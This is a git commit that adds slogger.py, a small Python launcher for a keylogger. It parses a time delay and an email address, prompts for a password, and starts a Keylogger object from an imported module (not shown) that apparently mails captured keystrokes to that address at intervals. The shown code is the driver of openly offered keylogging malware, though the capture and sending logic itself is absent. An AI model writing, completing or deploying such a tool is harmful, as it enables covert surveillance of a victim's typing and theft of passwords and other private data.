e505d32732db50e683f5a0591a7f1ec03f198c4c
Satwik Sinha <52771564+Satwik26@users.noreply.github.com>
2022-01-30 09:23:17 -0500

    Add files via upload

---
+++ slogger.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+import optparse
+import keylogger
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--timeDelay", dest="t_delay", help=("Enter time delay in seconds"))
+    parser.add_option("-u", "--username", dest="username", help=("Enter your emailId to get report on"))
+    (options, arguments) = parser.parse_args()
+    if not options.t_delay:
+        print("[-] Please specify time delay, --help for more info")
+    elif not options.username:
+        print("[-] Please give emailId: ")
+    return options
+
+psswd = input("Enter password: ")
+try:
+    if __name__ == "__main__":
+        my_keylogger = keylogger.Keylogger(int(get_arguments().t_delay), str(get_arguments().username), str(psswd))
+        my_keylogger.start()
+except KeyboardInterrupt:
+    print("[-] CTRL+C detected......Exiting keylogger")
